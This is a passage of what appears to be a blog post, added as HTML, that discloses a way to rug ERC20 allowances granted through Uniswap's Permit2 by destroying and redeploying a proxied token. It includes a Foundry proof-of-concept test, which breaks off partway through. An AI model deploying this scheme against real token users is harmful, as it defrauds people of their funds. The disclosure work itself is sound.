@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+  
+  <meta name="author" content="merkleplant">
+
+  
+  
+  <meta name="description" content="On November the 17th Uniswap released a new generation token approval contract - Permit2.
+Permit2 is an exciting new piece of infrastructure enabling token approval
+management independent of the ERC20 token implementation itself.
+However, it also enables a new rug vector to steal allowances via sandwich
+selfdestruct-ing and redeploying the token.">
+  
+
+  
+  <link rel="icon" href="https://garden.merkleplant.xyz/favicon.ico">
+
+  
+  
+  <meta name="keywords" content=" hugo  latex  theme ">
+  
+
+  
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css"
+  integrity="sha384-KiWOvVjnN8qwAZbuQyWDIbfCLFhLXNETzBQjA/92pIowpC0d2O3nppDGQVgwd2nB" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.js"
+  integrity="sha384-0fdwu/T/EQMsQlrHCCHoH10pkPLlKA1jL5dFyUOvB3lfeT2540/2g6YgSi2BL14p" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/contrib/auto-render.min.js"
+  integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: '$$', right: '$$', display: true },
+        { left: '\\[', right: '\\]', display: true },
+        { left: '$', right: '$', display: false },
+        { left: '\\(', right: '\\)', display: false }
+      ],
+      ignoredTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code', 'option'],
+      throwOnError: false
+    });
+  });
+</script>
+
+
+  
+
+  
+  <meta property="og:title" content="Rugging ERC20 Allowances via Permit2" />
+<meta property="og:description" content="On November the 17th Uniswap released a new generation token approval contract - Permit2.
+Permit2 is an exciting new piece of infrastructure enabling token approval
+management independent of the ERC20 token implementation itself.
+However, it also enables a new rug vector to steal allowances via sandwich
+selfdestruct-ing and redeploying the token." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://garden.merkleplant.xyz/post/rugging-erc20-allowances-via-permit2/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-11-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-11-21T00:00:00+00:00" />
+
+
+
+  
+  <link rel="canonical" href="https://garden.merkleplant.xyz/post/rugging-erc20-allowances-via-permit2/">
+
+  
+  
+  <meta itemprop="name" content="Rugging ERC20 Allowances via Permit2">
+<meta itemprop="description" content="On November the 17th Uniswap released a new generation token approval contract - Permit2.
+Permit2 is an exciting new piece of infrastructure enabling token approval
+management independent of the ERC20 token implementation itself.
+However, it also enables a new rug vector to steal allowances via sandwich
+selfdestruct-ing and redeploying the token."><meta itemprop="datePublished" content="2022-11-21T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-11-21T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1011">
+<meta itemprop="keywords" content="" />
+
+  
+  <link media="screen" rel="stylesheet" href='https://garden.merkleplant.xyz/css/common.css'>
+  <link media="screen" rel="stylesheet" href='https://garden.merkleplant.xyz/css/content.css'>
+
+  
+  
+  <title>Rugging ERC20 Allowances via Permit2 - merkleplant&#39;s garden </title>
+  
+
+  
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Rugging ERC20 Allowances via Permit2"/>
+<meta name="twitter:description" content="On November the 17th Uniswap released a new generation token approval contract - Permit2.
+Permit2 is an exciting new piece of infrastructure enabling token approval
+management independent of the ERC20 token implementation itself.
+However, it also enables a new rug vector to steal allowances via sandwich
+selfdestruct-ing and redeploying the token."/>
+
+
+  
+<link rel="stylesheet" href='https://garden.merkleplant.xyz/css/single.css'>
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header id="header">
+  <h1>
+    <a href="https://garden.merkleplant.xyz/">merkleplant&#39;s garden </a>
+  </h1>
+
+  <nav>
+    
+    <span class="nav-bar-item">
+      <a class="link" href="/">Posts</a>
+    </span>
+    
+    <span class="nav-bar-item">
+      <a class="link" href="/wikis/">Wikis</a>
+    </span>
+    
+    <span class="nav-bar-item">
+      <a class="link" href="https://merkleplant.xyz">About</a>
+    </span>
+    
+  </nav>
+</header>
+
+    
+<main id="main" class="post">
+  
+  
+  <h1>Rugging ERC20 Allowances via Permit2</h1>
+  
+  
+  <article class="content">
+    
+    <p>On November the 17th Uniswap released a new generation token approval contract - <a href="https://github.com/Uniswap/permit2"><code>Permit2</code></a>.</p>
+<p><code>Permit2</code> is an exciting new piece of infrastructure enabling token approval
+management independent of the ERC20 token implementation itself.</p>
+<p>However, it also enables a new rug vector to steal allowances via sandwich
+<em>selfdestruct</em>-ing and redeploying the token.</p>
+<p><strong>Disclaimer</strong>: The presented rug vector is <strong>not</strong> a security issue in the
+<code>Permit2</code> contract! I&rsquo;m writing this article as I didn&rsquo;t hear about
+such a rug vector before and wanted to share my findings.</p>
+<h2 id="introduction-to-permit2">Introduction to <code>Permit2</code></h2>
+<p>Via <code>Permit2</code> it is possible to manage token approvals outside of the ERC20
+token itself. The contract supports more configurations for approvals, such
+as time based approvals, then a default ERC20 token.</p>
+<p>In order for a user to enable the <code>Permit2</code> contract to manage its allowances,
+the contract needs to have approval to spend the user&rsquo;s tokens.</p>
+<p>A user can either approve infinite tokens to the contract using <code>type(uint).max</code>
+(interpreted in most ERC20 implementations as being infinite) or some finite
+amount.</p>
+<p>Note that the <code>Permit2</code> functionality can be disabled at any time by settings
+its allowance back to zero.</p>
+<h2 id="about-solmate-and-notorious-opcodes">About <code>solmate</code> and notorious opcodes</h2>
+<p><code>Permit2</code> uses the highly-optimized <a href="https://github.com/transmissions11/solmate"><code>solmate</code></a>
+library&rsquo;s <code>ERC20</code> implementation and <code>SafeTransferLib</code>. As you probably know,
+the ERC20 standard itself has some weaknesses concerning, among others, the
+transfer of tokens.</p>
+<p>In order to not having to handle ERC20&rsquo;s transfer issues by hand, most
+project nowadays use some &ldquo;<code>SafeERC20TransferLib</code>&rdquo;, with the most popular ones
+being the from <a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol">OpenZeppelin</a>
+and <a href="https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol"><code>solmate</code></a>.</p>
+<p>One major difference between the two libraries is that OpenZeppelin checks
+whether a contract exists, i.e. the address&rsquo; code size is non-zero, before
+calling ERC20&rsquo;s transfer function on that address, while <code>solmate</code> abdicates
+that check.</p>
+<p>Due to the definition of the EVM&rsquo;s <a href="https://www.evm.codes/#f1?fork=grayGlacier">call</a>
+opcode, this leads to the unfortunate situation that each transfer of ERC20
+tokens called on an empty, i.e. non-existing, contract succeeds.</p>
+<p>Another infamous opcode defined in the EVM is <a href="https://www.evm.codes/#ff?fork=grayGlacier"><code>selfdestruct</code></a> with which
+a contract can destroy itself, i.e. removing its code together with its storage.
+<code>selfdestruct</code>, especially in composition with the <a href="https://www.evm.codes/#f5?fork=grayGlacier"><code>create2</code></a>
+opcode challenges the immutability guarantees of contracts and leads to
+<a href="https://0age.medium.com/the-promise-and-the-peril-of-metamorphic-contracts-9eb8b8413c5e">interesting new concepts</a>.</p>
+<h2 id="the-idea">The Idea</h2>
+<p>Recapping the last paragraph, <code>Permit2</code> is an external ERC20 allowance
+management contract that continues working even if the token itself stops
+existing.</p>
+<p>Via the combination of <code>selfdestruct</code> and deterministic contract addresses
+via <code>create2</code> there exists a mechanism to destroy and redeploy tokens again to
+the same address.</p>
+<p>Last but no least, using already well known <a href="https://hackmd.io/@devtooligan/yAcademyGuideToProxies">Proxy</a>
+patterns, i.e. separating a contract&rsquo;s storage from its implementation, it is
+possible to keep the token&rsquo;s storage during a <em>destruct-and-redeploy</em> of a token.</p>
+<p>Digesting all these puzzle pieces leads to the possibility for a token creator
+to approve token allowances to users via <code>Permit2</code>, just to rug these allowances
+from the user again by destroying the token before a user&rsquo;s spending
+transaction, while being able to redeploy the token to the same address again
+afterwards.</p>
+<p>Furthermore, having private mempools for deterministic transaction ordering and
+proxy patterns for separating implementation and storage available, this leads
+to a new, and for unsophisticated users laborious recognizable, rug vector.</p>
+<h2 id="proof-of-concept">Proof-of-Concept</h2>
+<p>Below is a PoC implementation of the allowance-rug a token owner (or any
+address being able to destroy the token and knowing the <code>create2</code> salt) can carry
+out via the combination of <code>selfdestruct</code>-able tokens and <code>Permit2</code>.</p>
+<p>To run the code, clone <a href="https://github.com/pmerkleplant/Permit2-AllowanceRug">this repo</a>
+and run <code>forge install &amp;&amp; forge test --match-test &quot;testAllowanceRugSandwich&quot; -vvvvv</code>.</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span><span style="color:#204a87;font-weight:bold">pragma solidity</span> <span style="color:#ce5c00;font-weight:bold">^</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">.</span><span style="color:#0000cf;font-weight:bold">8</span><span style="color:#000;font-weight:bold">.</span><span style="color:#0000cf;font-weight:bold">17</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">import</span> <span style="color:#4e9a06">&#34;forge-std/Test.sol&#34;</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000;font-weight:bold">{</span><span style="color:#000">Permit2</span><span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">from</span> <span style="color:#4e9a06">&#34;../src/Permit2.sol&#34;</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000;font-weight:bold">{</span><span style="color:#000">ERC20</span><span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">from</span> <span style="color:#4e9a06">&#34;solmate/tokens/ERC20.sol&#34;</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000;font-weight:bold">{</span><span style="color:#000">TransparentUpgradeableProxy</span><span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">from</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#4e9a06">&#34;openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&#34;</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">import</span> <span style="color:#000;font-weight:bold">{</span><span style="color:#000">Create2</span><span style="color:#000;font-weight:bold">}</span> <span style="color:#204a87;font-weight:bold">from</span> <span style="color:#4e9a06">&#34;openzeppelin-contracts/contracts/utils/Create2.sol&#34;</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#204a87;font-weight:bold">contract</span> <span style="color:#000">AllowanceTransferRugTest</span> <span style="color:#204a87;font-weight:bold">is</span> <span style="color:#000">Test</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">Permit2</span> <span style="color:#000">permit2</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">RuggableERC20</span> <span style="color:#000">token</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">impl</span><span style="color:#000;font-weight:bold">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">alice</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">0xCAFE</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">eve</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">0xDEAD</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">eveProxyAdmin</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">0xDEAD2</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">setUp</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">permit2</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">Permit2</span><span style="color:#000;font-weight:bold">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Eve deploys the token implementation via create2.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// This enables her not having to change the proxy&#39;s implementation
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// after a redeployment.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">vm</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">prank</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eve</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">impl</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">Create2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">deploy</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">uint256</span><span style="color:#000;font-weight:bold">(</span><span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#204a87;font-weight:bold">bytes32</span><span style="color:#000;font-weight:bold">(</span><span style="color:#4e9a06">&#34;salt&#34;</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#204a87">type</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">RuggableERC20</span><span style="color:#000;font-weight:bold">).</span><span style="color:#204a87">creationCode</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// The token itself is managed via a proxy to not delete the token&#39;s
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// storage during a redeploy.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">token</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">RuggableERC20</span><span style="color:#000;font-weight:bold">(</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">TransparentUpgradeableProxy</span><span style="color:#000;font-weight:bold">({</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#000">_logic</span><span style="color:#ce5c00;font-weight:bold">:</span> <span style="color:#000">impl</span><span style="color:#000;font-weight:bold">,</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#000">admin_</span><span style="color:#ce5c00;font-weight:bold">:</span> <span style="color:#000">eveProxyAdmin</span><span style="color:#000;font-weight:bold">,</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#000">_data</span><span style="color:#ce5c00;font-weight:bold">:</span> <span style="color:#204a87;font-weight:bold">bytes</span><span style="color:#000;font-weight:bold">(</span><span style="color:#4e9a06">&#34;&#34;</span><span style="color:#000;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#000;font-weight:bold">})</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#000;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Eve holds a bunch of tokens.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">token</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">mint</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eve</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000">_000e18</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Eve enables Permit2 and approves tokens to Alice via Permit2&#39;s
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// AllowanceTransfer functionality.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">vm</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">startPrank</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eve</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#000">token</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">approve</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">permit2</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#204a87">type</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">uint256</span><span style="color:#000;font-weight:bold">).</span><span style="color:#204a87">max</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#000">permit2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">approve</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#000">alice</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000">_000e18</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87">type</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">uint48</span><span style="color:#000;font-weight:bold">).</span><span style="color:#204a87">max</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">vm</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">stopPrank</span><span style="color:#000;font-weight:bold">();</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#8f5902;font-style:italic">// This function should be executed via a private mempool, enabling Eve to
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#8f5902;font-style:italic">// deterministically sandwich Alice&#39;s allowance.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">testAllowanceRugSandwich</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">public</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Eve destroys the token implementation contract.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">_destroyTokenImplementation</span><span style="color:#000;font-weight:bold">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Alice spends allowance (without receiving tokens).
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">vm</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">prank</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">alice</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">permit2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">transferFrom</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eve</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#000">alice</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000">_000e18</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Eve redeploys the token implementation.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">_redeployTokenImplementation</span><span style="color:#000;font-weight:bold">();</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Token exists and it&#39;s storage did not change.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">assertEq</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eve</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#0000cf;font-weight:bold">1</span><span style="color:#000">_000e18</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Alice spent her Permit2 allowance...
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">uint160</span> <span style="color:#000">amount</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#8f5902;font-style:italic">/*expiration*/</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#8f5902;font-style:italic">/*nonce*/</span> <span style="color:#000;font-weight:bold">)</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#000">permit2</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">allowance</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eve</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#000">alice</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">assertEq</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">amount</span><span style="color:#000;font-weight:bold">,</span> <span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// ...without having received any tokens.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">assertEq</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">balanceOf</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">alice</span><span style="color:#000;font-weight:bold">),</span> <span style="color:#0000cf;font-weight:bold">0</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">_destroyTokenImplementation</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">internal</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Note that selfdestruct is executed at the end of a tx while a foundry
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// test is always executed in one tx (see Issue [1543](https://github.com/foundry-rs/foundry/issues/1543)).
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// To simulate the selfdestruct, we set the proxy&#39;s implementation to an
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// &#34;empty&#34; contract. However, OZ disallows setting the implementation to an
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// EOA, i.e. contract with no code.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">//
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// To simulate a contract with no code the &#34;empty&#34; contract only
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// implements an empty fallback.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#204a87;font-weight:bold">address</span> <span style="color:#000">empty</span> <span style="color:#ce5c00;font-weight:bold">=</span> <span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">new</span> <span style="color:#000">Empty</span><span style="color:#000;font-weight:bold">());</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">vm</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">prank</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eveProxyAdmin</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">TransparentUpgradeableProxy</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">payable</span><span style="color:#000;font-weight:bold">(</span><span style="color:#204a87;font-weight:bold">address</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">token</span><span style="color:#000;font-weight:bold">))).</span><span style="color:#000">upgradeTo</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">empty</span><span style="color:#000;font-weight:bold">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Real call would be:
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// vm.prank(eve);
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// token.destroy();
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>    <span style="color:#000;font-weight:bold">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#204a87;font-weight:bold">function</span> <span style="color:#000">_redeployTokenImplementation</span><span style="color:#000;font-weight:bold">()</span> <span style="color:#204a87;font-weight:bold">internal</span> <span style="color:#000;font-weight:bold">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#8f5902;font-style:italic">// Note to just change the token&#39;s implementation back to the real
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// implementation. This is due to foundry&#39;s missing feature of being
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#8f5902;font-style:italic">// able to test selfdestruct.
+</span></span></span><span style="display:flex;"><span><span style="color:#8f5902;font-style:italic"></span>        <span style="color:#000">vm</span><span style="color:#000;font-weight:bold">.</span><span style="color:#000">prank</span><span style="color:#000;font-weight:bold">(</span><span style="color:#000">eveProxyAdmin</span><span style="color:#000;font-weight:bold">);</span>
